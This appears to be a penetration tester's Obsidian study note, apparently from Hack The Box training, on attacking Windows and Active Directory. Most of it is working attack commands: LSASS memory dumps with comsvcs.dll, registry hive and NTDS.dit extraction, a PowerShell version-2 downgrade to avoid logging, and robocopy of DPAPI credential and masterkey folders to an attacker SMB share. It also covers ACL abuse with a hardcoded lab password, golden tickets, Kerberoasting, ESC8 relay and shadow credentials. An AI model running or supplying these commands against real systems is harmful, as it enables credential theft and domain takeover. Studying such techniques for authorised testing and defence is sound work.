---
type: knowledge
category: os, windows
tags:
  - knowledge/os
aliases:
  - windows
---
```toc
```


# Commands (CMD)
Search for file:
```powershell
dir C:\Users\ /s /b | findstr /i "NAME"
```

Output content of file:
```powershell
type FILENAME.txt
```

## Ping Sweep in CMD
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
# Enumeration
The default `ttl` of a windows host is typically `128` and more rarely `32` :
```text
PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

![[Rpcclient#RPCClient User Enumeration By RID]]

![[NetExec#Crawl SMB-share]]

![[BloodHound#Map entire domain from Linux - BloodHound]]
## Enum User-profile
Check System for files containing Credentials (Snaffler):
![[Scripts#^89e064]]
Check NetFramwork version:
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release | Select-Object Release
```

![[PowerView#Recursive Group Membership - PowerView]]
### Check Powershell command history
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```
And also check all available modules:
```powershell
Get-Module
```

### List all users with local Admin rights
```powershell
Get-LocalGroupMember -Group "Administrators"
```
### Gather Domain Information

#### Enum DC
```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

#### Enum Computers
```powershell
dsquery computer
```

![[PowerView#List Users of group `Remote Desktop Users` (RDP)]]

![[PowerView#List Users of group `Remote Management Users` (WinRM)]]

#### List other user-sessions
##### With Dsquery
```powershell
dsquery user
```

##### With net commands
`net commands` are monitored in many environments and can therefor be very noisy:
```powershell
net1 user /domain
```


### Bloodhound
![[SharpHound#Overall scan - SharpHound]]

### Check Security Controls

#### ACL / ACE
Windows ACLs determine which objects a domain user has access to and which actions they are permitted to perform. 
> [!INFO] Note
Enumerating ACL's manually can be very time consuming! If possible, running `Bloodhound`will save us a lot of time.
##### Manually - Living of the Land
1. We will create a list with  all domainusers:
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
2. We then read each line of the file using a `foreach` loop, and use the `Get-Acl` cmdlet to retrieve ACL information for each domain user by feeding each line of the `ad_users.txt` file to the `Get-ADUser` cmdlet. We then select just the `Access property`, which will give us information about access rights. Finally, we set the `IdentityReference` property to the user we are in control of (or looking to see what rights they have), in this case, `wley`:
```powershell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
3. The GUID's/object-type will now be unreadable. In order to resolve them to a readable name, we can either check them online or perform a reverse search/mapping:
```powershell
$guid= "00299570-246d-11d0-a768-00aa006e0529"
```

```powershell
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```


![[PowerView#Query Users ACL - Powerview]]


#### Check Windows Defender status
If the`RealTimeProtectionEnabled` parameter is set to `True` , the Windows Defender is enabled on the system:
```powershell
Get-MpComputerStatus
```

#### Check Applocker
[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Check if LAPS is in place
```powershell
Find-LAPSDelegatedGroups
```

Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for:
```powershell
Find-AdmPwdExtendedRights
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access:
```powershell
Get-LAPSComputers
```

### Bypass Security Controls
#### PowerShell Version donwgrade
Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older:
```powershell
powershell.exe -version 2
```

## CVE enumeration with Build number
Powershell-script for enumeration of exact `Update Build Revision (UBR)`:
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | Select-Object
```

### Filter CVE's

![[WES-NG#WES-NG with `Systeminfo` Output]]


#### Manual CVE lookup

After finding the exact build e.g. "10.0.14393" it's also an option to manually check for vulnerabilities on this Microsoft site (It can be a little bit time-consuming, since it only allows to filter for a time-length of maximum 1 year ...): https://msrc.microsoft.com/update-guide

### Builds and corresponding Versions

| **Major Build**           | **Windows OS / Version**                | **Release-Jahr** |
| ------------------------- | --------------------------------------- | ---------------- |
| **7601**                  | Windows 7 SP1 / Server 2008 R2 SP1      | 2011             |
| **9600**                  | Windows 8.1 / Server 2012 R2            | 2013             |
| **10240**                 | Windows 10 (Initial 1507)               | 2015             |
| **14393**                 | Windows 10 (1607) / Windows Server 2016 | 2016             |
| **17763**                 | Windows 10 (1809) / Windows Server 2019 | 2018             |
| **19041 - 19045**         | Windows 10 (2004 bis 22H2)              | 2020–2022        |
| **20348**                 | Windows Server 2022                     | 2021             |
| **22000 / 22621 / 22631** | Windows 11 (21H2, 22H2, 23H2)           | 2021–2023        |
| **26100**                 | Windows 11 24H2 / Windows Server 2025   | 2024             |
https://www.gaijin.at/en/infos/windows-version-numbers#:~:text=Windows%20Version%20Numbers%20%2D%20Version%20and%20build%20numbers%20of%20Microsoft%20Windows.%20Gaijin.at.%20Gaijin.%20DE.

https://learn.microsoft.com/en-us/windows/release-health/release-information

# Domain Systems
## Enumeration
### List all domain users
List all domain users and save them in a list:
![[PowerView#Enum domain-users]]

### Check user privileges
```cmd
whoami /priv
```

### Check Domain Trust Relationsships

#### Living of the Land
```powershell
Import-Module activedirectory
```

```powershell
Get-ADTrust -Filter *
```

![[PowerView#Checking for Existing Trusts - PowerView]]

### Check if Domainuser-Group has rights over any GPO
```powershell
$sid=Convert-NameToSid "Domain Users"
```

```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

### Check Foreign Group Members in Forest Trust

![[PowerView#Check Foreign Group Members - PowerView]]

## ExtraSids Attack
To perform this attack after compromising a child domain, we need the following:

1. The KRBTGT hash for the child domain
2. The SID for the child domain
3. The name of a target user in the child domain (does not need to exist!)
4. The FQDN of the child domain.
5. The SID of the Enterprise Admins group of the root domain.
6. With this data collected, the attack can be performed with Mimikatz.

This whole process can also be done automatically on Linux:
![[Scripts#raiseChild.py]]
### KRBTGT
 Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the `KRBTGT` account.


![[Mimikatz#Dump all NTLM-Hashes and Kerberos-Keys - Mimikatz]]
#### from Linux:
![[Scripts#Dump all NTLM-Hashes and Kerberos-Keys - secretsdump.py]]

### SID of Child Domain
We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output from the commands above.
![[PowerView#Retrieve SID of Domain - PowerView]]
#### from Linux:
![[Scripts#Performing Domain-SID Brute Forcing - IMPACKET lookupsid.py]]

### Enterprise Admins Group's SID
Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.
![[PowerView#Obtaining Enterprise Admins Group's SID - PowerView]]

### Golden Ticket
![[Mimikatz#Forging a Golden Ticket - Mimikatz]]

![[Rubeus#Forging a Golden Ticket - Rubeus]]
#### from Linux:
![[Scripts#Forging a Golden Ticket - IMPACKET ticketer.py]]


## ASREP Roasting
#### Check if ASREP-Roasting is possible
When `ASREP` is set on a users account, we can retrieve its password-hash and possible crack it locally with hashcat.
> [!INFO] Note
When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

It is also possible to enumerate accounts with the `UF_DONT_REQUIRE_PREAUTH` from Linux:
https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
![[Scripts#^c40b20]]

![[PowerView#Enumerating for DONT_REQ_PREAUTH Value - PowerView]]

![[Rubeus#ASREP-Roast Useraccount]]

![[Hashcat#Kerberos 5, etype 23, AS-REP]]



## User and Groups
![[PowerView#Change domain User password]]

#### Add User to Group
1. Set password and username of "privileged" user:
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

```powershell
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

2. Add user to Group
```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

3. Check if the user got successfully added:
```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
##### Remove user from group
When we are done with our "attack-chain" we should remove the user from the group. (In this example with the same `$Cred2` value as in the "add user to Group" section):
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

#### Add SPN to User
This is especially useful, when we have `read&write` privileges for e.g an `DC-Sync user` , which password we are not allowed to change, thus enabling us to retrieve his password hash and keroboroast it:
1. Set "privileged" credentials:
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

```powershell
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```
2. Add  `SPN` to target user (e.g. Admin):
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

##### Remove SPN from User
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

## Kerboroasting - from Linux
All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

![[GetUserSPNs#Kerboroasting - GetUserSPNs]]

![[Hashcat#Kerberos 5 TGS-REP etype 23 (RC4-HMAC)]]
## Kerboroasting - from Windows
All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Important to note is, that there are different `encryption types`. The enryption-tpye in the example here is `18`, which is in second place and would be `AES256`:
```Kerberos-Hash
$krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$.....
```

| **eType (ID)** | **Kerberos Encryption Type** | **Rubeus / AD Designation** | **Hashcat Mode**   | **Cracking Speed** | **Practical Relevance**                                                 |
| -------------- | ---------------------------- | --------------------------- | ------------------ | ------------------ | ----------------------------------------------------------------------- |
| **`23`**       | `RC4-HMAC`                   | `RC4_HMAC` / `ARCFOUR`      | **13100**          | ⚡ Very fast        | **Primary target for roasting** (easiest to crack).                     |
| **`18`**       | `AES256-CTS-HMAC-SHA1-96`    | `AES256`                    | **19700**          | 🐢 Very slow       | **AD default** (since Server 2008), unless enforced otherwise.          |
| **`17`**       | `AES128-CTS-HMAC-SHA1-96`    | `AES128`                    | **19600**          | 🐢 Very slow       | Less common, as systems usually default straight to AES-256.            |
| **`1`**        | `DES-CBC-CRC`                | `DES`                       | **13100** (Legacy) | ⚡ Extremely fast   | 🪦 Obsolete / Insecure (disabled by default in modern AD environments). |
| **`2`**        | `DES-CBC-MD5`                | `DES`                       | **13100** (Legacy) | ⚡ Extremely fast   | 🪦 Obsolete / Insecure (disabled by default in modern AD environments). |
| **`3`**        | `DES3-CBC-SHA1`              | `3DES` / `DES3`             | -                  | 🐢 Slow            | 🪦 Obsolete (rarely seen in practice).                                  |


### Kerboroasting - Automated

![[Rubeus#Kerboroasting - Rubeus]]

![[PowerView#Kerboroasting - PowerView]]

### Kerboroasting - "Manually"

![[Setspn#Kerboroasting - setspn.exe]]

![[Mimikatz#Extracting Tickets from Memory - Mimikatz]]

![[John the ripper#.Kirbi (extracting Ticket)]]

![[Hashcat#Kerberos 5 TGS-REP etype 23 (RC4-HMAC)]]



## DC-Sync Attack
DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

![[PowerView#Check if user has DC-Sync attribute set - PowerView]]

![[PowerView#Check which user has Reversible Encryption set]]

### Dump Credentials from Linux
![[Scripts#Dump all NTLM-Hashes and Kerberos-Keys - secretsdump.py]]

### Dump Credentials from Windows

![[Mimikatz#Dump all NTLM-Hashes and Kerberos-Keys - Mimikatz]]


## Bruteforce Credentials

1. Enumerate employees names and create a list of possible usernames. [[Scripts#^ae4ba4]]
2. Test "usernames-list" against the domain controller with `kerbrute`. Kerberute utilities `Kerberos Protocol (default port TCP/UDP 88)`:
![[Kerbrute#^3327c7]]

3. Bruteforce found user's with `NetExec` over `SMB`:
![[NetExec#^d1ba59]]

## Capturing NTDS.dit
`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain.
### Method 1 - Netexec
`Domain-Admin needed!`
![[NetExec#^6a9338]]
### Method 2 - EvilWinRM
`Domain-Admin needed!`
1. Connect to the DC with a domain-admin:
![[Evil-WinRM#^5b956a]]
2. Checking user rights:
```powershell
net localgroup
```

```powershell
net user bwilliamson
```

3. Creating shadow copy of `C:` (which is the default location of the "NTDS.dit" file)_
```powershell
vssadmin CREATE SHADOW /For=C:
```

4. Extract the "NTDS.dit" file from the shadow copy:
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\Temp
```

5. In order to access the contents of the "NTDS.dit" file we will need a key stored in `HKLM\System` which is described here: [[Windows#^677058]]
6. Transfer the two files to attackbox with e.g. SMB-share or Http-Upload server,etc.
7. Retrieve the contents of the `NTDS.dit`:

![[Scripts#^c66c6c]]
![[Mimikatz#Dump NTDS.DIT (mimikatz)]]
# Local Systems
## Dump Hashes
More Infos to LSA & lsass.exe can be found here:
https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html
#### SAM-DB
![[NetExec#^d807fd]]

### LSA-Secret (Local Security Authority)
With local admin:
#### Method 1 - fast
![[NetExec#^af05ba]]

#### Method 2 - slow

1. Launch `cmd.exe` with administrative privileges and export following as `hive`..
...SAM-DB (local User accounts): ^0e75ca
```cmd
reg.exe save hklm\sam C:\Temp\sam.save
```
GUI-Path is: `Computer\HKEY_LOCAL_MACHINE\SAM`

...System (bootkey for decrypting sam & security):
```cmd
reg.exe save hklm\system C:\Temp\system.save
```
^677058
GUI-Path is: `Computer\HKEY_LOCAL_MACHINE\SYSTEM`
...Security/LSA-Secrets (stores domain credentials, wifi, vpn and browser passwords) & DPAPI:
```cmd
reg.exe save hklm\security C:\Temp\security.save
```
^085fb3

2. Move them to attackbox e.g with BASE64, SMB-Share, Webserver, etc. 

3. Dump the content of the "stolen" files and retrieve needed hashes (such as users):
![[Scripts#^e38c79]]
4. Decrypt hash (in this case NTLM):
![[Hashcat#^8e92ef]]


#### LSASS-Process (Local Security Authority Sub System)
The Lsass-process stores all sensitive security-data which windows need for ongoing authentications and session(-handling) . They can be extracted either via GUI`Taskmanager`...

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260909174057.png)

...or via the `rundll32.exe` process:
1. determine the PID assigned to `lsass.exe`:
```cmd
tasaklist /svc
```

```powershell
Get-Process lsass
```
2.  With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`):
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
3. Move file to attackbox e.g with SMB-Share, Webserver, etc. 
4. extract contents with `Pypykatz`:
![[Pypykatz#^ed5e20]]


## Credential Manager
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260910080805.png)
The `Credentials Manager` allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%UserProfile%AppData\Roaming\Microsoft\Protect\SID`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\` ^9efbd0

Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves

Enumerate credentials stored in the current user profile:
```cmd
cmdkey /list
```

| Key         | Value                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| Type        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| User        | The user account associated with the credential.                                                                                                           |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |

Stored windows/domain credentials can be used with `runas` to impersonate said user (here we execute the `cmd` as stored user "mcharles" ):
```cmd
runas /savecred /user:SRV01\mcharles cmd
```
HINT: If the user has local admin rights it's best to execute `msconfig` from his cmd. Because `msconfig` automatically executes as Admin and the "cmd" doesn't. 

### Extract and decrypt stored Credentials
#### Direct way
with `SharpDPAPI.exe`

1. Retrieve the `NET-Framwork Version` in order to know, which `SharpDPAPI.exe` Version is compatible: 
```powershell
(Get-ItemProperty "HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full").Version
```
2. Upload the corresponding Version to the target system: https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.0_Any
3. Execute it and voila:
![[Scripts#^18b326]]
#### {INCOMPLETE} Stealthy way 
1. Retrieve `HKLM\Security / DPAPI key`,  `HKLM\System` and `HKLM\SAM` as described here: [[Windows#^0e75ca]]]
2. Copy the needed Credentials to your local machine, they are stored here: [[Windows#^9efbd0]]. IMPORTANT: Some of the files can only be seen in the explorer if `Hide protected operating system files (Recommended)` is deactivated or with the cli-command:
```cmd
dir /a:h C:\Users\sadams\AppData\Roaming\Microsoft\Credentials\
```
3. In order to copy the hidden GUID-files such as  e.g.`71F0853FE0793DBBD06FAA64931BCD3D` and the `VPOL/VSCH` files (containing the credentials) admin rights are needed. It's easiest to copy directly to an smbshare on the attackbox with  `robocopy` :
`GUID` files-location:
```cmd
robocopy C:\Users\sadams\AppData\Roaming\Microsoft\Credentials \\10.10.15.95\share /E
```
`VOPL & VSCH` files-location:
```
robocopy C:\ProgramData\Microsoft\Vault \\10.10.15.95\share /E
```
4. Retrieve the masterkey from `%UserProfile%AppData\Roaming\Microsoft\Protect\SID` 
```
robocopy C:\Users\sadams\AppData\Roaming\Microsoft\Protect \\10.10.15.95\share /E
```
5. Extract the `dpapi_machinekey` and `dpapi_userkey` and write them down:
![[Scripts#^9d0297]]

6. Figure out the needed GUID/Masterkey for the encryption of the File and write it down:
```python
python3 -c '
import uuid
with open("71F0853FE0793DBBD06FAA64931BCD3D", "rb") as f:
    data = f.read()
    guid_bytes = data[36:52]
    print("Masterkey GUID:", str(uuid.UUID(bytes_le=guid_bytes)))
'
```

7. Couldn't figure out how to decrypt it properly on a local machine....
# Pass the Certificate (PtC)
## AD CS NTLM Relay Attack (ESC8)
`ESC8`as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

![[319163d800f90a8bcda153ee44c756fe_MD5.png]]

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:
![[Scripts#ntlmrelayx.py]]

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug. This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces 10.129.234.174(DC01) to attempt authentication against 10.10.15.95 (attacker host):

![[Scripts#printerbug.py]]

We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using gettgtpkinit.py:
![[Scripts#^57dd50]]

Now we can continue as usual with the ccache ticket:
[[Linux#Loading Ccache file]]

![[Scripts#Dump Admin Password-Hash with DC-Ccache]]

And last but not least, establish an admin connection to the DC via PtH:
![[Evil-WinRM#Pass the Hash (WinRM)]]
## Shadow Credentials (msDS-KeyCredentialLink)
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

![[525b069c866abb21596874b943c757a5_MD5.png]]

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

![[pyWhisker#^f9a01d]]

With the command above, we can create  a `PFX (PKCS12)` file was  (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim and store it in `/tmp/jpinkman.ccache`:
![[Scripts#^67293c]]

Now we can continue as usual with the ccache ticket:
[[Linux#Loading Ccache file]]

And connect with `evilWinRM`:
![[Evil-WinRM#Pass the Certificate (WinRM)]]
# Pass the Ticket (PtT) - Kerberos
## Harvesting Tickets
To get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

![[Mimikatz#Harvesting Ticket - Mimikatz]]

![[Scripts#Harvesting Tickets - Rubeus.exe]]

## Pass the Key aka. OverPass the Hash
> [!INFO] Note
Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

![[Scripts#Pass the Key - Rubeus.exe]]

# Pass the Hash (PtH) - NTLM
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
> [!INFO] Note
There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. 
## From Windows 
![[03 Tools/Scripts/Powershell#Invoke-TheHash (powershell)]]

![[Mimikatz#Pass the Hash (SMB,RCP or Kerberos)]]
## From Linux

![[xfreerdp#Pass the Hash (using RDP)]]

![[NetExec#Pass the hash (SMB)]]

![[Scripts#Psexec (SMB)]]

![[Evil-WinRM#Pass the Hash (WinRM)]]
# Bitlocker
### Brutforce Bitlocker (VHD)
1. Retrieve Hashes via JtR:
![[John the ripper#^5b5e4f]]

2. Filter the needed user-password (0):
```bash
 grep "bitlocker\$0" bitlocker.txt > bit.txt
```

3. Bruteforce the `bitlocker\$0` user-hashvalue:
![[Hashcat#^4fb3f5]]


### Mount  Bitlocker-Drive
1. Create to folders to mount later:
```bash
sudo mkdir -p /media/bitlocker /media/bitlockermount
```

2. Configure the `VHD` as loop device
```bash
sudo losetup -f -P BITLOCKER.vhd
```
3. Check the partition of the created `loop-device` aka `virtuel Harddisk`
```bash
lsblk | grep loop
```
To make sure check the hexdump of the loop-device, if the value is `-FVE-FS` or `MSWIND4.1` it is the bitlocker VHD:
```bash
hexdump -C -n 64 /dev/loop0p1
```
4. And decrypt the drive using ``dislocker`
```bash
 sudo dislocker -v /dev/loop0p1 -u"PASSWORD" -- /media/bitlocker
```
5. Mount the decrpyted volume:
```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```
6. Now we can ckeck the contents of the file: 
```bash
cd /media/bitlockermount/
```
7. Once we are done. Stop all processes, unmount the drives and delete the folders:
```bash
sudo fuser -k -m /media/bitlockermount /media/bitlocker
```

```bash
sudo umount /media/bitlockermount /media/bitlocker
```

```bash
sudo rm -rf /media/bitlockermount /media/bitlocker
```

# File Transfer & Fileless attacks
## Using Base64
1. Check the MD5-hashvalue to ensure the integrity of the data later:
```bash
md5sum FILENAME
```
2. Encode file/data in base64
```bash
cat FILENAME |base64 -w 0;echo
```
3. Copy&Paste the encoded data to the target system (linux) and decode file/data:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\FILENAME", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
4. Confirm the hashvalue from step "1." to make sure, that the data hasn't changed:
```powershell
Get-FileHash C:\Users\Public\FILENAME -Algorithm md5
```

## Powershell

![[03 Tools/Powershell#File Download]]

![[03 Tools/Powershell#Fileless attack]]
## Using SMB Server

![[Scripts#smbserver.py]]

## Using FTP Server

![[FTP#Python FTP Server]]

![[FTP#Transferring Files from an FTP Server using PowerShell]]

## Using HTTP Server
![[Scripts#uploadserver]]

![[03 Tools/Powershell#Using Invoke-WebRequest]]

## Using SSH Server
![[SSH#2.3 - Setting up SSH Server]]

## Local processes and files explained

### Possible ACL Abuse Paths
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261002121412.png)
### Authentication Process
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260909110505.png)

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260909104722.png)

### Living off The Land
